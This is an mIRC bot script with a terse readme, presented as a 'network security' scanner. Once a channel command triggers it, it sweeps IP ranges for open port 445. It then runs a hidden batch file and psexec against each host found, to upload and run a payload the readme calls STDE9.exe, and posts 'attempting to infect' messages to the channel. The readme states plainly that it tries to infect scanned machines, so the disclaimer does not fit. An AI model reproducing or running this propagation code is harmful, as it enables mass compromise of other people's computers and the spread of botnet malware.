+----------------------------+
+-----gtSEv1.Scanner-----+
+---StandAlone.Version---+
+-----------------------------+

;this script was made to test your network's security as an administrator;
;i am not responsible for any damage or loss of networking connectivity you may cause using it;
;contact: #Crystals on mesra-e.dal.net, talk to lance-, anything with *please*help*send*give*how* will be ignored;
;this readme is for people with some skills. i wont explain much and dont even try asking for help;

;IF YOU USE THIS CODE IN YOUR PROGRAM GIVE ME CREDIT!;

;a) add this in your script somewhere;

on 720:text:#YOUR-BOT's-CHANNEL:{
  if ($1 == !startscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { msg # 2[14scanner2]14 starting scan from: $2 to $3 | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
  if ($1 == !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg # 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* | run libparse.exe -kf psexec.exe }
}

;this works like: !startscan <start-ip> <end-ip>
;dont forget to send your bot a file named STDE9.exe wich is the file he will upload/run on found ip's;
;make sure your bot adds you to level 720 when you !login.. or just change 720 to whatever your current is;

;b) add this in your script bottom;

on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run YOUR-HIDEWINDOW.exe /n /fh /r "msvxc.bat %445 $+ " | msg # 2[14scanner2]14 found: %445 $+ , attempting to infect.. | sockclose $sockname | unset %445 | halt }
alias finished { msg # 2[14scanner2]14 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }
alias startscan {
  inc %totalscaning
  if %totalscaning == %total finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 445
  if $1 == 1 finished
  sockopen ip2 %ip2 445
  if $1 == 2 finished
  sockopen ip3 %ip3 445
  if $1 == 3 finished
  sockopen ip4 %ip4 445
  if $1 == 4 finished
  sockopen ip5 %ip5 445
  if $1 == 5 finished
  sockopen ip6 %ip6 445
  if $1 == 6 finished
  sockopen ip7 %ip7 445
  if $1 == 7 finished
  sockopen ip8 %ip8 445
  if $1 == 8 finished
  sockopen ip9 %ip9 445
  if $1 == 9 finished
  sockopen ip10 %ip10 445
  if $1 == 10 finished
  sockopen ip11 %ip11 445
  if $1 == 11 finished
  sockopen ip12 %ip12 445
  if $1 == 12 finished
  sockopen ip13 %ip13 445
  if $1 == 13 finished
  sockopen ip14 %ip14 445
  if $1 == 14 finished
  sockopen ip15 %ip15 445
  if $1 == 15 finished
  sockopen ip16 %ip16 445
  if $1 == 16 finished
  sockopen ip17 %ip17 445
  if $1 == 17 finished
  sockopen ip18 %ip18 445
  if $1 == 18 finished
  sockopen ip19 %ip19 445
  if $1 == 19 finished
  sockopen ip20 %ip20 445
  if $1 == 20 finished
  sockopen ip21 %ip21 445
  if $1 == 21 finished
  sockopen ip22 %ip22 445
  if $1 == 22 finished
  sockopen ip23 %ip23 445
  if $1 == 23 finished
  sockopen ip24 %ip24 445
  if $1 == 24 finished
  sockopen ip25 %ip25 445
  timerscannerTE 1 12 sockclose ip*
  timerscannerSA 1 15 startscan
}

;replace YOUR-HIDEWINDOW.exe with the name of your hidewindow tool (must be the original hidewindow);
;this script will scan 25 simultanious ip's and TRY to infect them;